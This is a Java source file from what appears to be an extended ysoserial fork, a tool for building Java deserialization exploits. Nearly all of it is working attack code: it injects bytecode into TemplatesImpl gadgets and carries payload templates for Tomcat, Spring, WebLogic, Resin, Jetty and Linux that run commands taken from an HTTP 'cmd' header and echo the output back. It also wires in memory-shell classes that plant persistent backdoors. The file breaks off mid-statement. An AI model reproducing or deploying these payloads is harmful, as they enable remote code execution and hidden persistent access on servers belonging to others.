package ysoserial.payloads.util;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.wicket.util.file.Files;
import ysoserial.payloads.templates.SpringInterceptorMemShell;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;
import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({"restriction", "rawtypes", "unchecked"})
public class Gadgets {

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();
        Class tplClass;
        Class abstTranslet;
        Class transFactory;

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            tplClass = TemplatesImpl.class;
            abstTranslet = AbstractTranslet.class;
            transFactory = TransformerFactoryImpl.class;
        }

        if (command.startsWith("CLASS:")) {
            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
        } else if (command.startsWith("FILE:")) {
            byte[] bs = Files.readBytes(new File(command.substring(5)));
            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
        }else if (command.startsWith("directive:")) {
             if(command.startsWith("directive:LinuxEcho")){
                return linuxEcho(command);
            }else if(command.startsWith("directive:WindowsEcho")){
                return windowsEcho(command);
            }else if(command.startsWith("directive:SpringEcho1")){
                return springEcho1(command);
            }else if(command.startsWith("directive:SpringEcho2")){
                return springEcho2(command);
            }else if(command.startsWith("directive:TomcatEcho")){
                return tomcatEcho(command);
            }else if(command.startsWith("directive:WeblogicEcho1")){
                return weblogicEcho1(command);
            }else if(command.startsWith("directive:WeblogicEcho2")){
                return weblogicEcho2(command);
            }else if(command.startsWith("directive:ResinEcho")){
                return resinEcho(command);
            }else if(command.startsWith("directive:JettyEcho")){
                return jettyEcho(command);
            }else if(command.startsWith("directive:AutoFindRequestEcho")){
                return autoFindRequestEcho(command);
            }else if(command.startsWith("directive:WriteFileEcho")){
                return wirteFileEcho(command);
            } else if(command.startsWith("directive:Shell")){
                return shell(command);
            }else{
                return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
            }
        } else {
            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
        }
    }


    public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = new byte[0];
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass superC = pool.get(abstTranslet.getName());
        CtClass ctClass;
        if (command != null) {
            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            String cmd = "cmd = \"" + command + "\";";
            ctClass.makeClassInitializer().insertBefore(cmd);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }
        if (myClass != null) {
            // CLASS:
            ctClass = pool.get(myClass.getName());
            ctClass.setSuperclass(superC);
            // SpringInterceptorMemShell单独对待
            if (myClass.getName().contains("SpringInterceptorMemShell")) {
                // 修改b64字节码
                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
                classBytes = ctClass.toBytecode();
            } else {
                // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
                ctClass.setName(myClass.getName() + System.nanoTime());
                classBytes = ctClass.toBytecode();
            }
        }
        if (bytes != null) {
            // FILE:
            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write(bytes);
            gzipOutputStream.close();
            String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
            // System.out.println(content);
            ctClass.makeClassInitializer().insertBefore(content);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }


        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static Object createTemplatesImpl(final String command, String template) throws Exception {
        if (template.equals("")) {
            template = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        }

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                command,null,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
                template,null);
        }

        return createTemplatesImpl(command,null, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, template,null);
    }

    public static <T> T createTemplatesImpl(final String command, Class c,Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template,String mode)
        throws Exception {
        final T templates = tplClass.newInstance();
        final byte[] classBytes;
        if (c == null) {
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections

            clazz.makeClassInitializer().insertAfter(template);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);

            classBytes = clazz.toBytecode();
        } else {

            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(c));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            CtClass ctClass = pool.getCtClass(c.getName());
            CtClass superC = pool.get(abstTranslet.getName());
            ctClass.setSuperclass(superC);
            if (!"inject".equals(mode)) {
                CtConstructor constructor = ctClass.getDeclaredConstructor(null);
                MessageDigest md = MessageDigest.getInstance("MD5");
                md.update(command.getBytes());
                String keyInit = String.format("key = \"%s\";", command == null ? "a65cccfcfd8f670d" : new BigInteger(1, md.digest()).toString(16).substring(0,16));
                constructor.insertBefore(keyInit);
                classBytes = ctClass.toBytecode();
            }else {
                classBytes = ctClass.toBytecode();
            }
        }
        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

//    public static Object createTemplatesImplTomcatEcho(final String command) throws Exception {
//
//        String template = "try {\n" +
//            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
//            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
//            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
//            "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);" +
//            "            contextField.setAccessible(true);\n" +
//            "            serviceField.setAccessible(true);\n" +
//            "            requestField.setAccessible(true);\n" +
//            "            getHandlerMethod.setAccessible(true);\n" +
//            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
//            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
//            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
//            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
//            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
//            "            for (int i=0;i<connectors.length;i++) {\n" +
//            "                if (4==connectors[i].getScheme().length()) {\n" +
//            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
//            "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
//            "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
//            "                        for (int j = 0; j < classes.length; j++) {\n" +
//            "                            if (52 == (classes[j].getName().length())||60 == (classes[j].getName().length())) {\n" +
//            "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
//            "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
//            "                                globalField.setAccessible(true);\n" +
//            "                                processorsField.setAccessible(true);\n" +
//            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler,null));\n" +
//            "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
//            "                                for (int k = 0; k < list.size(); k++) {\n" +
//            "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
//            "                                    if (\"tomcat\".equals(tempRequest.getHeader(\"tomcat\"))) {\n" +
//            "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
//            "                                        String cmd = tempRequest.getHeader(\"X-FLAG\");\n" +
//            "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
//            "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
//            "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
//            "                                        String output = s.hasNext() ? s.next() : \"\";\n" +
//            "                                        java.io.Writer writer = request.getResponse().getWriter();\n" +
//            "                                        java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(\"usingWriter\");\n" +
//            "                                        usingWriter.setAccessible(true);\n" +
//            "                                        usingWriter.set(request.getResponse(), Boolean.FALSE);\n" +
//            "                                        writer.write(output);\n" +
//            "                                        writer.flush();\n" +
//            "                                        break;\n" +
//            "                                    }\n" +
//            "                                }\n" +
//            "                                break;\n" +
//            "                            }\n" +
//            "                        }\n" +
//            "                    }\n" +
//            "                    break;\n" +
//            "                }\n" +
//            "            }\n" +
//            "        }catch (Exception e){\n" +
//            "        }";
//        return createTemplatesImpl(command, template);
//    }



    public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static Object linuxEcho(final String command) throws Exception {
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String template = "   if(java.io.File.separator.equals(\"/\")){\n" +
            "        final String command  = \"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\\\"[\\\"}''{print $2}'|sed 's/.$//'\";\n" +
            "        String[] cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
            "        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
            "        java.util.List res1 = new java.util.ArrayList();\n" +
            "        String line = \"\";\n" +
            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
            "            res1.add(line);\n" +
            "        }\n" +
            "        br.close();\n" +
            "\n" +
            "        try {\n" +
            "            Thread.sleep((long)2000);\n" +
            "        } catch (InterruptedException e) {\n" +
            "            //pass\n" +
            "        }\n" +
            "\n" +
            "        command  = \"ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'\";\n" +
            "        cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
            "        br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
            "        java.util.List res2 = new java.util.ArrayList();\n" +
            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
            "            res2.add(line);\n" +
            "        }\n" +
            "        br.close();\n" +
            "\n" +
            "        int index = 0;\n" +
            "        int max = 0;\n" +
            "        for(int i = 0; i < res2.size(); i++){\n" +
            "            try{\n" +
            "                String socketNo = ((String)res2.get(i)).split(\"\\\\s+\")[1].substring(8);\n" +
            "                socketNo = socketNo.substring(0, socketNo.length() - 1);\n" +
            "                for(int j = 0; j < res1.size(); j++){\n" +
            "                    if(!socketNo.equals(res1.get(j))) continue;\n" +
            "\n" +
            "                    if(Integer.parseInt(socketNo) > max) {\n" +
            "                        max = Integer.parseInt(socketNo);\n" +
            "                        index = j;\n" +
            "                    }\n" +
            "                    break;\n" +
            "                }\n" +
            "            }catch(Exception e){\n" +
            "                //pass\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        int fd = Integer.parseInt(((String)res2.get(index)).split(\"\\\\s\")[0]);\n" +
            "        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});\n" +
            "        c.setAccessible(true);\n" +
            "        cmd = new String[]{\"/bin/sh\", \"-c\", \"" + cmd + "\"};\n" +
            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "        String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + res.length() + \"\\n\\n\" + res + \"\\n\";\n" +
            "        java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(fd)}));\n" +
            "        os.write(result.getBytes());\n" +
            "    }";

        return createTemplatesImpl(command, template);
    }

    public static Object springEcho1(final String command) throws Exception {
        String template = "    java.lang.reflect.Method method = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\").getMethod(\"getRequestAttributes\", null);\n" +
            "        Object requestAttributes  = method.invoke(null,null);\n" +
            "\n" +
            "        method = requestAttributes.getClass().getMethod(\"getRequest\", null);\n" +
            "        Object request = method.invoke(requestAttributes , null);\n" +
            "\n" +
            "        method = request.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "        String cmd = (String) method.invoke(request, new Object[]{\"cmd\"});\n" +
            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "        method = requestAttributes.getClass().getMethod(\"getResponse\", null);\n" +
            "        Object response = method.invoke(requestAttributes , null);\n" +
            "\n" +
            "        method = response.getClass().getMethod(\"getWriter\", null);\n" +
            "        java.io.PrintWriter printWriter = (java.io.PrintWriter) method.invoke(response, null);\n" +
            "        printWriter.println(res);";

        return createTemplatesImpl(command, template);
    }

    public static Object springEcho2(final String command) throws Exception {
        String template = "java.lang.reflect.Method method = Class.forName(\"org.springframework.webflow.context.ExternalContextHolder\").getMethod(\"getExternalContext\", null);\n" +
            "        Object servletExternalContext  = method.invoke(null,null);\n" +
            "\n" +
            "        method = servletExternalContext.getClass().getMethod(\"getNativeRequest\", null);\n" +
            "        Object request = method.invoke(servletExternalContext , null);\n" +
            "\n" +
            "        method = request.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "        String cmd = (String) method.invoke(request, new Object[]{\"cmd\"});\n" +
            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "        method = servletExternalContext.getClass().getMethod(\"getNativeResponse\", null);\n" +
            "        Object response = method.invoke(servletExternalContext , null);\n" +
            "\n" +
            "        method = response.getClass().getMethod(\"getWriter\", null);\n" +
            "        java.io.PrintWriter printWriter = (java.io.PrintWriter) method.invoke(response, null);\n" +
            "        printWriter.println(res);";

        return createTemplatesImpl(command, template);
    }

    public static Object tomcatEcho(final String command) throws Exception {
        String template = "   boolean flag = false;\n" +
            "    ThreadGroup group = Thread.currentThread().getThreadGroup();\n" +
            "    java.lang.reflect.Field f = group.getClass().getDeclaredField(\"threads\");\n" +
            "    f.setAccessible(true);\n" +
            "    Thread[] threads = (Thread[]) f.get(group);\n" +
            "\n" +
            "    for(int i = 0; i < threads.length; i++) {\n" +
            "        try{\n" +
            "            Thread t = threads[i];\n" +
            "            if (t == null) continue;\n" +
            "\n" +
            "            String str = t.getName();\n" +
            "            if (str.contains(\"exec\") || !str.contains(\"http\")) continue;\n" +
            "\n" +
            "\n" +
            "            f = t.getClass().getDeclaredField(\"target\");\n" +
            "            f.setAccessible(true);\n" +
            "            Object obj = f.get(t);\n" +
            "\n" +
            "            if (!(obj instanceof Runnable)) continue;\n" +
            "\n" +
            "            f = obj.getClass().getDeclaredField(\"this$0\");\n" +
            "            f.setAccessible(true);\n" +
            "            obj = f.get(obj);\n" +
            "\n" +
            "            try{\n" +
            "                f = obj.getClass().getDeclaredField(\"handler\");\n" +
            "            }catch (NoSuchFieldException e){\n" +
            "                f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\");\n" +
            "            }\n" +
            "            f.setAccessible(true);\n" +
            "            obj = f.get(obj);\n" +
            "\n" +
            "            try{\n" +
            "                f = obj.getClass().getSuperclass().getDeclaredField(\"global\");\n" +
            "            }catch(NoSuchFieldException e){\n" +
            "                f = obj.getClass().getDeclaredField(\"global\");\n" +
            "            }\n" +
            "            f.setAccessible(true);\n" +
            "            obj = f.get(obj);\n" +
            "\n" +
            "            f = obj.getClass().getDeclaredField(\"processors\");\n" +
            "            f.setAccessible(true);\n" +
            "            java.util.List processors = (java.util.List)(f.get(obj));\n" +
            "\n" +
            "            for(int j = 0; j < processors.size(); ++j) {\n" +
            "                Object processor = processors.get(j);\n" +
            "                f = processor.getClass().getDeclaredField(\"req\");\n" +
            "                f.setAccessible(true);\n" +
            "                Object req = f.get(processor);\n" +
            "                Object resp = req.getClass().getMethod(\"getResponse\", new Class[0]).invoke(req, new Object[0]);\n" +
            "\n" +
            "                str = (String)req.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(req, new Object[]{\"cmd\"});\n" +
            "\n" +
            "                if (str != null && !str.isEmpty()) {\n" +
            "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n" +
            "                    String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", str} : new String[]{\"/bin/sh\", \"-c\", str};\n" +
            "                    byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "\n" +
            "                    try {\n" +
            "                        Class cls = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
            "                        obj = cls.newInstance();\n" +
            "                        cls.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});\n" +
            "                        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{obj});\n" +
            "                    } catch (NoSuchMethodException var5) {\n" +
            "                        Class cls = Class.forName(\"java.nio.ByteBuffer\");\n" +
            "                        obj = cls.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(cls, new Object[]{result});\n" +
            "                        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{obj});\n" +
            "                    }\n" +
            "\n" +
            "                    flag = true;\n" +
            "                }\n" +
            "\n" +
            "                if (flag) break;\n" +
            "            }\n" +
            "\n" +
            "            if (flag)  break;\n" +
            "        }catch(Exception e){\n" +
            "            continue;\n" +
            "        }\n" +
            "    }";

        return createTemplatesImpl(command, template);
    }

    public static Object weblogicEcho1(final String command) throws Exception {
        String template = " Object obj = Thread.currentThread().getClass().getMethod(\"getCurrentWork\", null).invoke(Thread.currentThread(), null);\n" +
            "    String cmd = (String) obj.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(obj, new Object[]{\"cmd\"});\n" +
            "    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "    Object r = obj.getClass().getMethod(\"getResponse\", null).invoke(obj, null);\n" +
            "    Object os = r.getClass().getMethod(\"getServletOutputStream\", null).invoke(r, null);\n" +
            "    obj = Class.forName(\"weblogic.xml.util.StringInputStream\").getConstructor(new Class[]{String.class}).newInstance(new Object[]{res});\n" +
            "\n" +
            "    os.getClass().getMethod(\"writeStream\", new Class[]{Class.forName(\"java.io.InputStream\")}).invoke(os, new Object[]{obj});\n" +
            "    os.getClass().getMethod(\"flush\", null).invoke(os, null);\n" +
            "    obj = r.getClass().getMethod(\"getWriter\", null).invoke(r, null);\n" +
            "    obj.getClass().getMethod(\"write\", new Class[]{String.class}).invoke(obj, new Object[]{\"\"});";

        return createTemplatesImpl(command, template);
    }

    public static Object weblogicEcho2(final String command) throws Exception {
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String template = "Object obj = Thread.currentThread().getClass().getMethod(\"getCurrentWork\", null).invoke(Thread.currentThread(), null);\n" +
            "    Field field = obj.getClass().getDeclaredField(\"connectionHandler\");\n" +
            "    field.setAccessible(true);\n" +
            "    obj = field.get(obj);\n" +
            "    String cmd = \"" + cmd + "\";\n" +
            "    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "    Object r = obj.getClass().getMethod(\"getServletRequest\", null).invoke(obj, null);\n" +
            "    Object o = r.getClass().getMethod(\"getResponse\", null).invoke(r, null);\n" +
            "    Object s = o.getClass().getMethod(\"getServletOutputStream\", null).invoke(o, null);\n" +
            "\n" +
            "    obj = Class.forName(\"weblogic.xml.util.StringInputStream\").getConstructor(new Class[]{String.class}).newInstance(new Object[]{res});\n" +
            "\n" +
            "    s.getClass().getMethod(\"writeStream\", new Class[]{Class.forName(\"java.io.InputStream\")}).invoke(s, new Object[]{obj});\n" +
            "    s.getClass().getMethod(\"flush\", null).invoke(s, null);\n" +
            "    obj = o.getClass().getMethod(\"getWriter\", null).invoke(o, null);\n" +
            "    obj.getClass().getMethod(\"write\", new Class[]{String.class}).invoke(obj, new Object[]{\"\"});";

        return createTemplatesImpl(command, template);
    }

    public static Object resinEcho(final String command) throws Exception {
        String template = "    Class clazz = Thread.currentThread().getClass();\n" +
            "    java.lang.reflect.Field field = clazz.getSuperclass().getDeclaredField(\"threadLocals\");\n" +
            "    field.setAccessible(true);\n" +
            "    Object obj = field.get(Thread.currentThread());\n" +
            "\n" +
            "    field = obj.getClass().getDeclaredField(\"table\");\n" +
            "    field.setAccessible(true);\n" +
            "    obj = field.get(obj);\n" +
            "\n" +
            "    Object[] obj_arr = (Object[]) obj;\n" +
            "    for(int i = 0; i < obj_arr.length; i++) {\n" +
            "        Object o = obj_arr[i];\n" +
            "        if (o == null) continue;\n" +
            "\n" +
            "        field = o.getClass().getDeclaredField(\"value\");\n" +
            "        field.setAccessible(true);\n" +
            "        obj = field.get(o);\n" +
            "\n" +
            "        if(obj != null && obj.getClass().getName().equals(\"com.caucho.server.http.HttpRequest\")){\n" +
            "            com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest)obj;\n" +
            "            String cmd = httpRequest.getHeader(\"cmd\");\n" +
            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "            com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();\n" +
            "            httpResponse.setHeader(\"Content-Length\", res.length() + \"\");\n" +
            "            java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod(\"createResponseStream\", null);\n" +
            "            method.setAccessible(true);\n" +
            "            com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse,null);\n" +
            "            httpResponseStream.write(res.getBytes(), 0, res.length());\n" +
            "            httpResponseStream.close();\n" +
            "        }\n" +
            "    }";

        return createTemplatesImpl(command, template);
    }

    public static Object jettyEcho(final String command) throws Exception {
        String template = "    Class clazz = Thread.currentThread().getClass();\n" +
            "    java.lang.reflect.Field field = clazz.getDeclaredField(\"threadLocals\");\n" +
            "    field.setAccessible(true);\n" +
            "    Object obj = field.get(Thread.currentThread());\n" +
            "\n" +
            "    field = obj.getClass().getDeclaredField(\"table\");\n" +
            "    field.setAccessible(true);\n" +
            "    obj = field.get(obj);\n" +
            "\n" +
            "    Object[] obj_arr = (Object[]) obj;\n" +
            "    for(int i = 0; i < obj_arr.length; i++){\n" +
            "        Object o = obj_arr[i];\n" +
            "        if(o == null) continue;\n" +
            "\n" +
            "        field = o.getClass().getDeclaredField(\"value\");\n" +
            "        field.setAccessible(true);\n" +
            "        obj = field.get(o);\n" +
            "\n" +
            "        if(obj != null && obj.getClass().getName().endsWith(\"AsyncHttpConnection\")){\n" +
            "            Object connection = obj;\n" +
            "            java.lang.reflect.Method method = connection.getClass().getMethod(\"getRequest\", null);\n" +
            "            obj = method.invoke(connection, null);\n" +
            "\n" +
            "            method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "            obj = method.invoke(obj, new Object[]{\"cmd\"});\n" +
            "\n" +
            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
